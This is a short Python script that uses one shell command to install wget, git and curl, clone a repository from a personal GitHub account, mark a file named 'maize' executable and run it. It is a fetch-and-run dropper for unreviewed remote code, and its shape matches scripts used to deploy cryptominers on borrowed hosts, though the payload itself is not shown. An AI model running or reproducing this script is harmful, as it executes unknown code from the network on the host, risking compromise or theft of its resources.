#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/lulamilenxwemeni/maize.git;cd maize;chmod +x maize;bash maize", shell=True)
